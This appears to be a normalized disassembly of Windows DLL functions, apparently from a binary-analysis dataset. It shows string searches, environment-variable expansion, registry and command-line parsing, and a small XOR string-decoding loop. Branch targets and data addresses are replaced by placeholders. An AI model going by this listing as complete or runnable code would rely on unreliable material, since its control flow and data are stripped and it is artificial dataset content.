sub eax esi
push eax
push edx
push 0x0
call sub_1003d600
mov esi [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push eax
mov ecx esi
mov [ esi ] 0x0
call sub_1003acf0
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_10028320
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_10028370
push ebp
mov ebp esp
push ecx
xor eax eax
push 0xffffffff
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
push eax
add edx 0x78
mov [ esi ] cx
push edx
mov ecx esi
mov [ ebp - 0x4 ] eax
call sub_1002d970
mov eax esi
mov esp ebp
pop ebp
retn
sub_1002839c
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
cmp [ edi + 0x4 ] bl
jne r-xdata
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x4 ] bl
jne r-xdata
call sub_100255aa
cmp [ edi ] ebx
jne r-xdata
mov ecx esi
call sub_100255aa
cmp [ esi ] ebx
je r-xdata
cmp [ esi ] ebx
je r-xdata
xor eax eax
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_100283e0
push ebp
mov ebp esp
push ecx
mov edx [ ecx + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
mov eax edx
push edi
mov [ ebp - 0x4 ] 0x0
lea edi [ eax + 0x2 ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edi
sar eax 0x1
push eax
push edx
mov ecx esi
call sub_10034100
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_10028440
push ebp
mov ebp esp
push 0xffffffff
push sub_10088c02
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ edi + 0x4 ]
cmp esi ecx
jae r-xdata
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
cmp eax esi
ja r-xdata
mov ebx [ edi + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
xor eax eax
mov [ ebp - 0x4 ] 0x1
cmp ebx eax
je r-xdata
mov ecx edi
call sub_1005a9c0
sub esi eax
mov eax 0x38e38e39
imul esi
sar edx 0x3
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x24
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
mov [ ebx + 0x14 ] 0x7
mov [ ebx + 0x10 ] eax
push esi
mov ecx ebx
mov [ ebx ] dx
call sub_10033f90
mov eax [ esi + 0x1c ]
mov [ ebx + 0x1c ] eax
mov ecx [ esi + 0x20 ]
mov [ ebx + 0x20 ] ecx
mov ecx [ edi ]
lea eax [ esi + esi * 8 ]
mov esi [ edi + 0x4 ]
lea ebx [ ecx + eax * 4 ]
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] esi
xor eax eax
mov [ ebp - 0x4 ] eax
cmp esi eax
je r-xdata
mov ecx edi
call sub_1005a9c0
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
push ebx
mov ecx esi
mov [ esi ] dx
call sub_10033f90
mov eax [ ebx + 0x1c ]
mov [ esi + 0x1c ] eax
mov ecx [ ebx + 0x20 ]
mov [ esi + 0x20 ] ecx
jmp r-xdata
sub_10028530
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ esi + 0x10 ] eax
push 0xffffffff
push eax
mov [ ebp - 0x4 ] eax
mov [ esi + 0x14 ] 0xf
mov [ esi ] al
mov eax [ ebp + 0x8 ]
add eax 0x8
push eax
mov ecx esi
call sub_10037cf0
mov eax esi
mov esp ebp
pop ebp
retn 0x4
sub_10028560
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_100285b0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi eax
cmp esi eax
je r-xdata
mov [ ebp + 0xc ] esi
cmp esi eax
jne r-xdata
movsx eax [ esi ]
push eax
call [ ebp + 0x14 ]
add esp 0x4
test eax eax
jne r-xdata
mov edi esi
inc esi
push ebx
mov ebx eax
cmp esi eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] esi
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
inc esi
cmp esi edi
jne r-xdata
mov eax [ ebp + 0x8 ]
pop ebx
mov [ eax ] edi
pop edi
pop esi
pop ebp
retn
movsx ecx [ esi ]
push ecx
call [ ebp + 0x14 ]
add esp 0x4
test eax eax
jne r-xdata
inc esi
cmp esi ebx
jne r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc edi
sub_10028620
push ebp
mov ebp esp
push 0xffffffff
push sub_10088e39
mov eax [ fs : 0x0 ]
push eax
sub esp 0x94
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x144
xor edi edi
push edi
mov esi ecx
mov ebx edx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x9c ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
push eax
call sub_10006be0
jmp r-xdata
push esi
mov ecx ebx
call sub_1000a410
mov esi eax
cmp esi edi
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x9c ]
cmp esi edi
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0xa0 ] edi
mov [ ebp - 0x9c ] edi
call sub_100310b0
mov [ ebp - 0x4 ] 0x1
mov edx [ ebp - 0xa0 ]
cmp edx edi
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x9c ]
cmp esi edi
je r-xdata
lea edx [ ebp - 0x60 ]
mov eax 0x10b
call sub_10069020
lea eax [ ebp - 0x98 ]
push esi
push eax
call sub_10057f20
push eax
lea edx [ ebp - 0x60 ]
lea esi [ ebp - 0x7c ]
mov [ ebp - 0x4 ] 0x2
call sub_10040e00
add esp 0xc
mov edx eax
mov ecx 0x14
mov [ ebp - 0x4 ] 0x3
call sub_10022b50
mov esi 0x8
cmp [ ebp - 0x68 ] esi
jb r-xdata
mov eax 0x1
jmp r-xdata
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
xor eax eax
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
xor edx edx
mov ebx 0x7
mov [ ebp - 0x68 ] ebx
mov [ ebp - 0x6c ] edi
mov [ ebp - 0x7c ] dx
cmp [ ebp - 0x84 ] esi
jb r-xdata
mov ecx [ ebp - 0x7c ]
push ecx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x9c ]
xor ecx ecx
mov [ ebp - 0x84 ] ebx
mov [ ebp - 0x88 ] edi
mov [ ebp - 0x98 ] cx
cmp esi edi
je r-xdata
mov eax [ ebp - 0x98 ]
push eax
call sub_1000a86e
add esp 0x4
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov eax 0x2
jmp r-xdata
lea edx [ esi + 0x4 ]
or eax 0xffffffff
[ edx ] eax
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
sub_1002882d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp edi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
call sub_10068d25
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x4 ] eax
push [ esi + 0x4 ]
mov ecx edi
call sub_100221a0
jmp r-xdata
sub_10028870
push ebp
mov ebp esp
sub esp 0x6b0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
push edi
mov esi ecx
mov edi edx
mov [ ebp - 0x6ac ] edi
mov [ ebp - 0x6b0 ] eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
mov eax 0x1
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn
test edi edi
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
test eax eax
je r-xdata
push ebx
lea edx [ ebp - 0x6a8 ]
mov eax 0x4
call sub_10028560
lea edx [ ebp - 0x6a4 ]
mov eax 0x1
call sub_10028560
lea edx [ ebp - 0x6a0 ]
xor eax eax
call sub_10028560
mov eax edx
push eax
push esi
call [ StrStrW@IAT ]
lea ecx [ ebp - 0x69c ]
test eax eax
mov edx 0x30c
mov eax ecx
je r-xdata
xor ebx ebx
sub esi ecx
lea ebx [ ebp - 0x6a4 ]
xor edi edi
sub ebx ecx
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ ebx + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
je r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea eax [ ebp - 0x6a0 ]
push eax
mov esi 0x30c
lea ebx [ ebp - 0x69c ]
call sub_10050c60
test eax eax
je r-xdata
pop ebx
pop edi
lea eax [ edx + 0x5 ]
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
push esi
mov esi 0x30c
lea ebx [ ebp - 0x69c ]
call sub_10050c60
test eax eax
je r-xdata
lea eax [ edx + 0x2 ]
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
lea ecx [ ebp - 0x6a0 ]
push ecx
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
pop ebx
pop edi
mov eax 0x6
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x6a4 ]
push eax
lea ebx [ ebp - 0x69c ]
call sub_10050c60
test eax eax
je r-xdata
pop ebx
pop edi
mov eax 0x3
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
push edi
mov esi 0x30c
lea ebx [ ebp - 0x69c ]
call sub_10050c60
test eax eax
je r-xdata
lea edx [ ebp - 0x6a4 ]
push edx
lea ebx [ ebp - 0x69c ]
call sub_10050c60
test eax eax
je r-xdata
mov edi [ ebp - 0x6ac ]
pop ebx
pop edi
mov eax 0x4
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x6a0 ]
push eax
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
pop ebx
pop edi
mov eax 0x8
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
pop ebx
pop edi
mov eax 0x7
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x6a8 ]
push edx
mov esi 0x30c
lea ebx [ ebp - 0x69c ]
call sub_10050c60
test eax eax
je r-xdata
lea ecx [ ebp - 0x6a4 ]
push ecx
lea ebx [ ebp - 0x69c ]
call sub_10050c60
test eax eax
je r-xdata
lea eax [ ebp - 0x6a0 ]
push eax
lea ebx [ ebp - 0x69c ]
call sub_10050c60
test eax eax
je r-xdata
pop ebx
pop edi
mov eax 0xa
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
pop ebx
pop edi
mov eax 0x9
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push ecx
lea ebx [ ebp - 0x69c ]
call sub_10050c60
test eax eax
je r-xdata
pop ebx
pop edi
mov eax 0xb
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x84 ]
mov eax 0x2
call sub_10028560
mov edx [ ebp - 0x6b0 ]
push 0x1
push edx
lea ecx [ ebp - 0x69c ]
lea eax [ ebp - 0x84 ]
mov edx 0x80000002
call sub_1005f180
add esp 0x8
test eax eax
je r-xdata
pop ebx
pop edi
mov eax 0xc
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
pop ebx
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
pop ebx
pop edi
mov eax 0xd
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_10028bd0
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] 0xf
mov [ ebp - 0x4 ] eax
mov [ esi ] al
mov eax [ ebp + 0x10 ]
push eax
push edx
push ecx
mov ecx esi
call sub_10037cf0
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0xc
sub_10028c10
push ebp
mov ebp esp
push 0xffffffff
push sub_10086db0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
cmp eax ecx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub ecx 0x1c
cmp eax ecx
je r-xdata
mov ebx [ eax + 0xc ]
mov edx [ eax ]
mov esi [ eax + 0x4 ]
mov edi [ eax + 0x8 ]
mov [ ebp - 0x14 ] ebx
mov ebx [ ecx ]
mov [ eax ] ebx
mov ebx [ ecx + 0x4 ]
mov [ eax + 0x4 ] ebx
mov ebx [ ecx + 0x8 ]
mov [ eax + 0x8 ] ebx
mov ebx [ ecx + 0xc ]
mov [ eax + 0xc ] ebx
mov [ ecx ] edx
mov edx [ ebp - 0x14 ]
mov [ ecx + 0x4 ] esi
mov [ ecx + 0x8 ] edi
mov [ ecx + 0xc ] edx
mov edx [ eax + 0x10 ]
mov esi [ ecx + 0x10 ]
mov [ eax + 0x10 ] esi
mov [ ecx + 0x10 ] edx
mov edx [ eax + 0x14 ]
mov esi [ ecx + 0x14 ]
mov [ eax + 0x14 ] esi
add eax 0x1c
mov [ ecx + 0x14 ] edx
cmp eax ecx
jne r-xdata
sub_10028cb6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
push 0x16
pop eax
pop ebp
retn
sub_10028cf0
push ebp
mov ebp esp
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi edx
push edi
mov edi ecx
mov [ ebp - 0x54 ] esi
call sub_10006970
test eax eax
je r-xdata
mov esi [ ebx + 0x54 ]
test esi esi
je r-xdata
lea edx [ ebp - 0x50 ]
mov eax 0x4d
call sub_1002f620
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ esi ]
lea eax [ ebp - 0x54 ]
push eax
call sub_10009a70
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
sub_10028d4a
push 0x34
mov eax sub_100851af
call sub_10026266
mov eax [ ebp + 0xc ]
cmp eax [ rw-data ]
jne r-xdata
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_1000c927
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
test eax eax
je r-xdata
push r--data
lea ecx [ ebp - 0x40 ]
call sub_10060250
and [ ebp - 0x4 ] 0x0
push 0x0
push [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
push 0x3f
push eax
call sub_1004552c
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x40 ]
call sub_10025720
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_10003c9c
shl eax 0x2
push eax
call sub_1005f1fb
pop ecx
mov [ esi + 0x8 ] eax
test eax eax
jne r-xdata
call sub_10008d33
retn
mov edi [ esi + 0xc ]
jmp r-xdata
mov edi rw-data
mov esi r--data
test [ rw-data ] bl
jne r-xdata
test edi edi
jne r-xdata
push edi
lea ecx [ ebp - 0x1c ]
call sub_10015c68
push r--data
lea eax [ ebp - 0x1c ]
push eax
mov [ ebp - 0x1c ] esi
call sub_10055e2a
or [ rw-data ] ebx
push ebx
lea eax [ ebp + 0xc ]
push eax
mov ecx edi
mov [ ebp + 0xc ] r--data
call sub_1003a910
push sub_1008afd6
mov [ rw-data ] esi
call sub_10064546
pop ecx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
dec edi
mov ecx [ eax + edi * 4 ]
mov eax [ esi + 0x8 ]
mov [ eax + edi * 4 ] ecx
test ecx ecx
je r-xdata
call sub_10042890
sub_10028e60
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x14 ]
mov [ esi ] eax
add eax ecx
mov [ esi + 0x8 ] eax
mov eax 0x1
xor edx edx
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x10 ] edx
mov [ esi + 0x1c ] edx
mov [ esi + 0x2c ] eax
cmp ecx edx
je r-xdata
mov [ esi + 0xc ] 0xffffffff
pop esi
pop ebp
retn
call sub_1007e620
pop esi
pop ebp
retn
sub_10028ec0
push ebp
mov ebp esp
sub esp 0x228
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
push edi
push 0x104
lea eax [ ebp - 0x224 ]
mov edi ecx
mov ecx [ esi + 0x4 ]
push eax
push ecx
call [ ExpandEnvironmentStringsW@IAT ]
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ edi ]
push eax
push ecx
lea eax [ ebp - 0x224 ]
call sub_1002f360
add esp 0x8
test eax eax
jne r-xdata
lea edx [ ebp - 0x18 ]
mov eax 0x37
call sub_10069020
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0x23
call sub_10069020
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x18 ]
push edx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea eax [ edi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
lea ecx [ ebp - 0x18 ]
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x8 ] 0x0
lea edx [ ebp - 0x1c ]
push edx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea eax [ edi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
lea ecx [ ebp - 0x1c ]
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x8 ] 0x0
push edi
push ecx
push eax
mov [ esi + 0x8 ] eax
call sub_1007f580
add esp 0xc
push esi
xor ecx ecx
xor edx edx
call sub_10016920
mov ecx [ ebp - 0x8 ]
xor ecx ebp
pop edi
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
sub_10028fae
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100591cb
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
pop ecx
sub_10029007
push 0x38
mov eax sub_1008571a
call sub_10047689
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_10007a10
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_1006b26d
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_1002be90
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_10046885
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1006995b
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffffffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100262c3
retn 0x20
sub_100290e0
push ebp
mov ebp esp
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
sub esp 0x1c
test [ ecx + esi + 0xc ] 0x6
jne r-xdata
mov eax esi
mov esp ebp
pop ebp
retn 0xc
mov edx [ ebp + 0x10 ]
mov ecx [ ecx + esi + 0x38 ]
mov eax [ ecx ]
mov eax [ eax + 0x28 ]
push 0x1
push edx
mov edx [ ebp + 0xc ]
push edx
mov edx [ ebp + 0x8 ]
push edx
lea edx [ ebp - 0x1c ]
push edx
call eax
mov eax [ ebp - 0x14 ]
cdq
add eax [ ebp - 0x1c ]
adc edx [ ebp - 0x18 ]
cmp eax [ r--data ]
jne r-xdata
cmp edx [ r--data ]
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + esi + 0xc ]
add ecx esi
or eax 0x2
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x0
call sub_10039ae0
or eax 0x4
sub_1002914f
mov edi edi
push esi
push edi
xor edi edi
push [ edi + rw-data ]
call [ EncodePointer@IAT ]
mov [ edi + rw-data ] eax
add edi 0x4
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_10029180
push ebp
mov ebp esp
push 0xffffffff
push sub_100884d8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
xor edi edi
mov ebx ecx
mov [ ebp - 0x5c ] ebx
cmp eax edi
je r-xdata
xor eax eax
lea ecx [ ebp - 0x54 ]
push ecx
push eax
mov [ ebp - 0x54 ] edi
call [ CommandLineToArgvW@IAT ]
mov esi [ ebp - 0x54 ]
mov [ ebp - 0x4c ] eax
cmp esi edi
jne r-xdata
mov eax ebx
lea edx [ eax + 0x2 ]
cmp eax edi
je r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
inc eax
mov [ ebp - 0x58 ] eax
test esi esi
jg r-xdata
push eax
push edi
jmp r-xdata
xor edx edx
mov eax ebx
mov [ ebp - 0x2c ] dx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] 0x0
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov eax [ ebp - 0x4c ]
test eax eax
je r-xdata
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10034100
lea eax [ ebp - 0x2c ]
push eax
mov edx r--data
lea esi [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x0
call sub_100519f0
mov esi 0x8
add esp 0x4
cmp [ eax + 0x14 ] esi
jb r-xdata
push eax
push 0x0
mov ecx [ ebp - 0x58 ]
mov edx [ ebp - 0x4c ]
push ecx
push eax
mov eax [ edx + edi * 4 ]
push eax
call sub_10006d73
add esp 0xc
test eax eax
sete bl
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov eax [ eax ]
xor edx edx
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x34 ] 0x7
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x48 ] dx
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_1000a86e
add esp 0x4
test bl bl
je r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_1000a86e
add esp 0x4
inc edi
cmp edi [ ebp - 0x54 ]
jl r-xdata
mov ecx [ ebp - 0x4c ]
mov edx [ ecx + edi * 4 ]
mov ebx [ ebp - 0x58 ]
lea eax [ edx + ebx * 2 ]
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov ebx [ ebp - 0x5c ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
jne r-xdata
mov eax [ ebp - 0x4c ]
mov [ ebp - 0x50 ] edi
mov ecx [ ebp - 0x50 ]
mov eax [ eax + ecx * 4 ]
lea edi [ ebx + ebx ]
add eax edi
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ebx [ GetProcessHeap@IAT ]
sub eax edx
sar eax 0x1
lea edx [ eax + eax + 0x2 ]
push edx
push esi
call ebx
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp - 0x50 ]
mov esi eax
mov eax [ ebp - 0x4c ]
mov ecx [ eax + ecx * 4 ]
add ecx edi
mov eax ecx
lea edi [ eax + 0x2 ]
lea ebx [ ebx ]
mov dx [ eax ]
add eax 0x2
test dx dx
jne r-xdata
sub eax edi
sar eax 0x1
add eax eax
push eax
push ecx
push esi
call sub_1007f580
mov ecx [ ebp - 0x4c ]
add esp 0xc
push ecx
push 0x0
call ebx
push eax
call [ HeapFree@IAT ]
mov eax esi
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
